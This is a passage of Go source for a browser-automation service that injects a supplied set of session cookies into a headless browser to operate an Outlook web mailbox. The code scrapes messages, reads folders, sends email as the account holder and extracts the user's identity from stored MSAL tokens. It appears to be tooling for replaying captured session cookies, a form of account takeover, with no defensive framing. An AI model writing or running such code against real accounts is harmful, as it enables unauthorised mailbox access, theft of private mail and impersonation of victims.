	if err != nil || result == nil {
		b.Logger.Warnw("DOM scraping failed", "error", err)
		return nil
	}

	var messages []model.InboxMessage
	if err := json.Unmarshal([]byte(result.Value.String()), &messages); err != nil {
		b.Logger.Warnw("failed to parse DOM scraping result", "error", err)
		return nil
	}

	b.Logger.Infow("DOM scraping extracted messages", "count", len(messages))
	return messages
}

// SendEmailViaBrowser sends an email using browser automation on Outlook web
func (b *BrowserSessionService) SendEmailViaBrowser(ctx context.Context, cookiesJSON string, to []string, subject, body string, isHTML bool, sessionKey string) error {
	b.Logger.Infow("sending email via browser automation", "to", to, "subject", subject, "sessionKey", sessionKey)

	// Use session cache if sessionKey is provided
	if sessionKey != "" {
		sess, err := b.getOrCreateSession(ctx, sessionKey, cookiesJSON)
		if err != nil {
			b.Logger.Warnw("failed to get/create cached session for send, falling back", "error", err)
			return b.sendEmailFresh(ctx, cookiesJSON, to, subject, body, isHTML)
		}

		sess.mu.Lock()
		defer sess.mu.Unlock()

		return b.sendEmailOnPage(sess.page, to, subject, body, isHTML)
	}

	return b.sendEmailFresh(ctx, cookiesJSON, to, subject, body, isHTML)
}

// sendEmailFresh sends email with a fresh browser instance
func (b *BrowserSessionService) sendEmailFresh(ctx context.Context, cookiesJSON string, to []string, subject, body string, isHTML bool) error {
	b.mu.Lock()
	defer b.mu.Unlock()

	var cookies []cookieEntry
	if err := json.Unmarshal([]byte(cookiesJSON), &cookies); err != nil {
		return fmt.Errorf("failed to parse cookies JSON: %w", err)
	}

	browser, cleanup, err := b.launchBrowser(ctx, 120*time.Second)
	if err != nil {
		return err
	}
	defer cleanup()

	page, err := b.setupPageWithCookiesAndSSO(browser, cookies)
	if err != nil {
		return err
	}

	return b.sendEmailOnPage(page, to, subject, body, isHTML)
}

// sendEmailOnPage performs the actual email sending on an already-authenticated page
func (b *BrowserSessionService) sendEmailOnPage(page *rod.Page, to []string, subject, body string, isHTML bool) error {
	// Navigate to compose
	composeURL := "https://outlook.live.com/mail/0/deeplink/compose"
	b.Logger.Infow("navigating to compose page", "url", composeURL)
	if err := page.Navigate(composeURL); err != nil {
		return fmt.Errorf("failed to navigate to compose: %w", err)
	}
	if err := page.WaitLoad(); err != nil {
		b.Logger.Warnw("compose page load timeout, continuing", "error", err)
	}
	time.Sleep(5 * time.Second)

	// Verify we're on the compose page
	pageTitle, _ := page.Eval(`() => document.title`)
	title := ""
	if pageTitle != nil {
		title = pageTitle.Value.String()
	}
	b.Logger.Infow("compose page loaded", "title", title)

	// Fill in the To field - try multiple selectors
	toSelectors := []string{
		`[aria-label="To"]`,
		`input[aria-label="To"]`,
		`div[aria-label="To"] input`,
		`input[placeholder*="To"]`,
		`div[role="textbox"][aria-label*="To"]`,
	}
	var toField *rod.Element
	var err error
	for _, sel := range toSelectors {
		toField, err = page.Element(sel)
		if err == nil && toField != nil {
			break
		}
	}
	if toField == nil {
		return fmt.Errorf("could not find To field with any selector")
	}

	for _, recipient := range to {
		toField.Input(recipient)
		toField.Type(input.Enter)
		time.Sleep(500 * time.Millisecond)
	}
	b.Logger.Infow("filled To field", "recipients", to)

	// Fill in Subject - try multiple selectors
	subjectSelectors := []string{
		`[aria-label="Add a subject"]`,
		`input[aria-label="Subject"]`,
		`input[aria-label="Add a subject"]`,
		`input[placeholder*="subject"]`,
	}
	var subjectField *rod.Element
	for _, sel := range subjectSelectors {
		subjectField, err = page.Element(sel)
		if err == nil && subjectField != nil {
			break
		}
	}
	if subjectField == nil {
		return fmt.Errorf("could not find Subject field with any selector")
	}
	subjectField.Input(subject)
	b.Logger.Infow("filled Subject field")

	// Fill in Body - try multiple selectors
	bodySelectors := []string{
		`[aria-label="Message body, press Alt+F10 to exit"]`,
		`div[role="textbox"][aria-label*="Message body"]`,
		`div[role="textbox"]`,
		`div[contenteditable="true"]`,
	}
	var bodyField *rod.Element
	for _, sel := range bodySelectors {
		bodyField, err = page.Element(sel)
		if err == nil && bodyField != nil {
			break
		}
	}
	if bodyField == nil {
		return fmt.Errorf("could not find body field with any selector")
	}

	if isHTML {
		_, evalErr := page.Eval(fmt.Sprintf(`() => {
			const selectors = [
				'[aria-label="Message body, press Alt+F10 to exit"]',
				'div[role="textbox"][aria-label*="Message body"]',
				'div[role="textbox"]',
				'div[contenteditable="true"]'
			];
			for (const sel of selectors) {
				const el = document.querySelector(sel);
				if (el) {
					el.innerHTML = %s;
					return true;
				}
			}
			return false;
		}`, jsonEscape(body)))
		if evalErr != nil {
			b.Logger.Warnw("HTML body injection failed, trying plain text", "error", evalErr)
			bodyField.Input(body)
		}
	} else {
		bodyField.Input(body)
	}
	b.Logger.Infow("filled Body field")

	time.Sleep(1 * time.Second)

	// Click Send button - try multiple selectors
	sendSelectors := []string{
		`button[aria-label="Send"]`,
		`button[title="Send"]`,
		`button[title="Send (Ctrl+Enter)"]`,
		`button[data-testid="send"]`,
	}
	var sendBtn *rod.Element
	for _, sel := range sendSelectors {
		sendBtn, err = page.Element(sel)
		if err == nil && sendBtn != nil {
			break
		}
	}
	if sendBtn == nil {
		// Try keyboard shortcut as fallback
		b.Logger.Infow("Send button not found, trying Ctrl+Enter shortcut")
		page.KeyActions().Press(input.ControlLeft).Type(input.Enter).MustDo()
	} else {
		sendBtn.Click(proto.InputMouseButtonLeft, 1)
	}

	time.Sleep(3 * time.Second)

	b.Logger.Infow("email sent via browser automation", "to", to, "subject", subject)
	return nil
}

// GetFoldersViaBrowser reads mail folders using a cached browser session
func (b *BrowserSessionService) GetFoldersViaBrowser(ctx context.Context, cookiesJSON string, sessionKey string) ([]model.InboxFolder, error) {
	b.Logger.Infow("reading folders via browser automation", "sessionKey", sessionKey)

	// Use session cache if sessionKey is provided
	if sessionKey != "" {
		sess, err := b.getOrCreateSession(ctx, sessionKey, cookiesJSON)
		if err != nil {
			b.Logger.Warnw("failed to get/create cached session for folders, falling back", "error", err)
			return b.getFoldersFresh(ctx, cookiesJSON)
		}

		sess.mu.Lock()
		defer sess.mu.Unlock()

		// Ensure we're on Outlook
		if err := b.ensureOnOutlook(sess.page); err != nil {
			b.Logger.Warnw("failed to ensure Outlook page for folders", "error", err)
			return b.getDefaultFolders(), nil
		}

		// Return default folders since we're already on Outlook
		return b.getDefaultFolders(), nil
	}

	return b.getFoldersFresh(ctx, cookiesJSON)
}

// getDefaultFolders returns a standard set of Outlook folders
func (b *BrowserSessionService) getDefaultFolders() []model.InboxFolder {
	return []model.InboxFolder{
		{ID: "inbox", DisplayName: "Inbox", TotalItemCount: 0, UnreadItemCount: 0},
		{ID: "sentitems", DisplayName: "Sent Items", TotalItemCount: 0, UnreadItemCount: 0},
		{ID: "drafts", DisplayName: "Drafts", TotalItemCount: 0, UnreadItemCount: 0},
		{ID: "junkemail", DisplayName: "Junk Email", TotalItemCount: 0, UnreadItemCount: 0},
		{ID: "deleteditems", DisplayName: "Deleted Items", TotalItemCount: 0, UnreadItemCount: 0},
	}
}

// getFoldersFresh reads folders with a fresh browser instance
func (b *BrowserSessionService) getFoldersFresh(ctx context.Context, cookiesJSON string) ([]model.InboxFolder, error) {
	b.mu.Lock()
	defer b.mu.Unlock()

	var cookies []cookieEntry
	if err := json.Unmarshal([]byte(cookiesJSON), &cookies); err != nil {
		return nil, fmt.Errorf("failed to parse cookies JSON: %w", err)
	}

	browser, cleanup, err := b.launchBrowser(ctx, 90*time.Second)
	if err != nil {
		return nil, err
	}
	defer cleanup()

	page, err := b.setupPageWithCookiesAndSSO(browser, cookies)
	if err != nil {
		return nil, err
	}

	// Enable network interception
	var capturedFolders []model.InboxFolder
	var foldersMu sync.Mutex
	var foldersFound bool

	err = proto.NetworkEnable{}.Call(page)
	if err != nil {
		b.Logger.Warnw("failed to enable network events", "error", err)
	}

	// Listen for folder API responses
	waitEvents := page.EachEvent(
		func(e *proto.NetworkResponseReceived) {
			reqURL := e.Response.URL
			isFolderAPI := (strings.Contains(reqURL, "folders") || strings.Contains(reqURL, "Folder")) &&
				(strings.Contains(reqURL, "outlook") || strings.Contains(reqURL, "substrate") || strings.Contains(reqURL, "office"))

			if !isFolderAPI || e.Response.Status != 200 {
				return
			}

			body, bodyErr := proto.NetworkGetResponseBody{RequestID: e.RequestID}.Call(page)
			if bodyErr != nil {
				return
			}

			folders := b.parseFolderResponse(body.Body)
			if len(folders) > 0 {
				foldersMu.Lock()
				capturedFolders = folders
				foldersFound = true
				foldersMu.Unlock()
			}
		},
	)
	_ = waitEvents

	if err := b.navigateToOutlook(page); err != nil {
		return nil, err
	}

	// Wait for folder API responses
	for i := 0; i < 15; i++ {
		time.Sleep(2 * time.Second)
		foldersMu.Lock()
		found := foldersFound
		foldersMu.Unlock()
		if found {
			break
		}
	}

	foldersMu.Lock()
	defer foldersMu.Unlock()

	// If no API response, return default folders
	if !foldersFound {
		b.Logger.Infow("no folder API response intercepted, returning default folders")
		capturedFolders = b.getDefaultFolders()
	}

	return capturedFolders, nil
}

// parseFolderResponse parses folder API responses
func (b *BrowserSessionService) parseFolderResponse(body string) []model.InboxFolder {
	// Try REST API format
	var restResp struct {
		Value []struct {
			ID              string `json:"Id"`
			OID             string `json:"id"`
			DisplayName     string `json:"DisplayName"`
			DisplayNameL    string `json:"displayName"`
			TotalItemCount  int    `json:"TotalItemCount"`
			TotalItemCountL int    `json:"totalItemCount"`
			UnreadCount     int    `json:"UnreadItemCount"`
			UnreadCountL    int    `json:"unreadItemCount"`
		} `json:"value"`
	}

	if json.Unmarshal([]byte(body), &restResp) == nil && len(restResp.Value) > 0 {
		var folders []model.InboxFolder
		for _, f := range restResp.Value {
			id := f.ID
			if id == "" {
				id = f.OID
			}
			name := f.DisplayName
			if name == "" {
				name = f.DisplayNameL
			}
			total := f.TotalItemCount
			if total == 0 {
				total = f.TotalItemCountL
			}
			unread := f.UnreadCount
			if unread == 0 {
				unread = f.UnreadCountL
			}
			folders = append(folders, model.InboxFolder{
				ID:              id,
				DisplayName:     name,
				TotalItemCount:  total,
				UnreadItemCount: unread,
			})
		}
		return folders
	}

	return nil
}

// injectCookies injects cookies into the browser page for all relevant Microsoft domains
func (b *BrowserSessionService) injectCookies(page *rod.Page, cookies []cookieEntry) error {
	var lastErr error
	injected := 0

	for _, c := range cookies {
		if c.Name == "" || c.Value == "" {
			continue
		}

		domain := c.Domain
		if domain == "" {
			continue
		}

		// Normalize domain
		if strings.HasPrefix(domain, ".") {
			domain = domain[1:]
		}

		path := c.Path
		if path == "" {
			path = "/"
		}

		secure := false
		switch v := c.Secure.(type) {
		case bool:
			secure = v
		case string:
			secure = v == "true" || v == "1"
		case float64:
			secure = v != 0
		}

		httpOnly := false
		switch v := c.HttpOnly.(type) {
		case bool:
			httpOnly = v
		case string:
			httpOnly = v == "true" || v == "1"
		case float64:
			httpOnly = v != 0
		}

		var expires proto.TimeSinceEpoch
		switch v := c.ExpirationDate.(type) {
		case float64:
			if v > 0 {
				expires = proto.TimeSinceEpoch(v)
			}
		case string:
			// Skip if empty
		}

		sameSite := proto.NetworkCookieSameSiteNone
		switch strings.ToLower(c.SameSite) {
		case "strict":
			sameSite = proto.NetworkCookieSameSiteStrict
		case "lax":
			sameSite = proto.NetworkCookieSameSiteLax
		case "none", "no_restriction":
			sameSite = proto.NetworkCookieSameSiteNone
		}

		scheme := "https"
		if !secure {
			scheme = "http"
		}
		cookieURL := fmt.Sprintf("%s://%s%s", scheme, domain, path)

		_, setErr := proto.NetworkSetCookie{
			Name:     c.Name,
			Value:    c.Value,
			Domain:   c.Domain,
			Path:     path,
			Secure:   secure,
			HTTPOnly: httpOnly,
			SameSite: sameSite,
			URL:      cookieURL,
			Expires:  expires,
		}.Call(page)

		if setErr != nil {
			lastErr = setErr
			b.Logger.Debugw("failed to inject cookie", "name", c.Name, "domain", c.Domain, "error", setErr)
		} else {
			injected++
		}
	}

	b.Logger.Infow("cookies injected", "injected", injected, "total", len(cookies))
	return lastErr
}

// extractAccountInfo extracts email and display name from MSAL cache in browser storage
func (b *BrowserSessionService) extractAccountInfo(page *rod.Page) (email, displayName string) {
	script := `() => {
		try {
			const storages = [sessionStorage, localStorage];
			for (const storage of storages) {
				for (let i = 0; i < storage.length; i++) {
					const key = storage.key(i);
					if (key && (key.includes('.account.') || key.includes('idtoken'))) {
						try {
							const val = JSON.parse(storage.getItem(key));
							if (val) {
								const email = val.username || val.preferred_username || '';
								const name = val.name || '';
								if (email || name) {
									return JSON.stringify({email: email, name: name});
								}
							}
						} catch(e) {}
					}
				}
			}
			// Also try OWA-specific storage keys
			for (const storage of storages) {
				for (let i = 0; i < storage.length; i++) {
					const key = storage.key(i);
					try {
						const val = storage.getItem(key);
						if (val && val.includes('@') && val.includes('.')) {
							// Try to parse as JSON
							try {
								const obj = JSON.parse(val);
								if (obj.email || obj.Email || obj.userPrincipalName || obj.mail) {
									return JSON.stringify({
										email: obj.email || obj.Email || obj.userPrincipalName || obj.mail || '',
										name: obj.displayName || obj.name || obj.Name || ''
									});
								}
							} catch(e2) {}
						}
					} catch(e) {}
				}
			}
		} catch(e) {}
		return '';
	}`

	result, err := page.Eval(script)
	if err != nil || result == nil {
		return "", ""
	}
	val := result.Value.String()
	if val == "" {
		return "", ""
	}

	var data struct {
		Email string `json:"email"`
		Name  string `json:"name"`
	}
	if json.Unmarshal([]byte(val), &data) == nil {
		return data.Email, data.Name
	}
	return "", ""
}

// extractEmailFromDOM tries to extract the email from the Outlook page DOM
func (b *BrowserSessionService) extractEmailFromDOM(page *rod.Page) string {
	// First try the account menu button which often has the email
	result, err := page.Eval(`() => {
		try {
			// Try the Microsoft account control (top-right profile button)
			const selectors = [
				'[data-testid="mectrl_currentAccount_secondary"]',
				'#mectrl_currentAccount_secondary',
				'#O365_MainLink_Me',
				'[aria-label*="Account manager"]',
				'button[data-tid="mectrl_main_trigger"]',
			];
			
			for (const sel of selectors) {
				const el = document.querySelector(sel);
				if (el) {
					const text = el.textContent.trim();
					if (text.includes('@')) return text;
					// Check title attribute
					if (el.title && el.title.includes('@')) return el.title;
					// Check aria-label
					const label = el.getAttribute('aria-label') || '';
					if (label.includes('@')) {
						const match = label.match(/[\w.-]+@[\w.-]+\.\w+/);
						if (match) return match[0];
					}
				}
			}
			
			// Try clicking the account button to reveal the email
			const accountBtn = document.querySelector('button[data-tid="mectrl_main_trigger"]') ||
			                   document.querySelector('#mectrl_main_trigger') ||
			                   document.querySelector('#O365_MainLink_Me');
			if (accountBtn) {
				accountBtn.click();
				// Wait a moment for the flyout to appear
				return new Promise(resolve => {
					setTimeout(() => {
						const emailEl = document.querySelector('#mectrl_currentAccount_secondary') ||
						                document.querySelector('[data-testid="mectrl_currentAccount_secondary"]');
						if (emailEl) {
							const text = emailEl.textContent.trim();
							// Close the flyout
							const closeBtn = document.querySelector('#mectrl_main_trigger');
							if (closeBtn) closeBtn.click();
							resolve(text);
						} else {
							// Search all visible text for email pattern
							const allText = document.body.innerText;
							const emailMatch = allText.match(/[\w.-]+@(outlook|hotmail|live|msn)\.\w+/i);
							resolve(emailMatch ? emailMatch[0] : '');
						}
					}, 1500);
				});
			}
			
			// Last resort: search page for email patterns in specific areas
			const allBtns = document.querySelectorAll('button[aria-label]');
			for (const btn of allBtns) {
				const label = btn.getAttribute('aria-label');
				if (label && label.includes('@')) {
					const match = label.match(/[\w.-]+@[\w.-]+\.\w+/);
					if (match) return match[0];
				}
			}
		} catch(e) {}
		return '';
	}`)

	if err == nil && result != nil {
		val := result.Value.String()
		if val != "" && strings.Contains(val, "@") {
			return strings.TrimSpace(val)
		}
	}

	return ""
}

// extractDisplayNameFromTitle extracts display name from Outlook page title
// Title format is typically "Mail - Jenessa Crook - Outlook"
func (b *BrowserSessionService) extractDisplayNameFromTitle(page *rod.Page) string {
	pageTitle, _ := page.Eval(`() => document.title`)
	if pageTitle == nil {
		return ""
	}
	title := pageTitle.Value.String()
	if strings.Contains(title, " - ") {
		parts := strings.Split(title, " - ")
		if len(parts) >= 2 {
			name := strings.TrimSpace(parts[1])
			// Don't return "Outlook" as a name
			if strings.ToLower(name) != "outlook" && name != "" {
				return name
			}
		}
	}
	return ""
}

// jsonEscape escapes a string for use in JavaScript
func jsonEscape(s string) string {
	b, _ := json.Marshal(s)
	return string(b)
}

// ParseCookiesForDomains returns cookies filtered by Microsoft/Outlook domains
func ParseCookiesForDomains(cookiesJSON string) ([]cookieEntry, error) {
	var cookies []cookieEntry
	if err := json.Unmarshal([]byte(cookiesJSON), &cookies); err != nil {
		return nil, err
	}

	msftDomains := []string{
		"live.com", "microsoft.com", "microsoftonline.com",
		"office.com", "office365.com", "outlook.com",
		"login.live.com", "outlook.live.com",
	}

	var filtered []cookieEntry
	for _, c := range cookies {
		domain := strings.TrimPrefix(c.Domain, ".")
		for _, d := range msftDomains {
			if strings.HasSuffix(domain, d) {
				filtered = append(filtered, c)
				break
			}
		}
	}

	return filtered, nil
}

// IsOutlookDomain checks if a URL belongs to an Outlook/Microsoft domain
func IsOutlookDomain(rawURL string) bool {
	u, err := url.Parse(rawURL)
	if err != nil {
		return false
	}
	host := strings.ToLower(u.Hostname())
	domains := []string{
		"live.com", "microsoft.com", "microsoftonline.com",
		"office.com", "office365.com", "outlook.com",
	}
	for _, d := range domains {
		if strings.HasSuffix(host, d) {
			return true
		}
	}
	return false
}
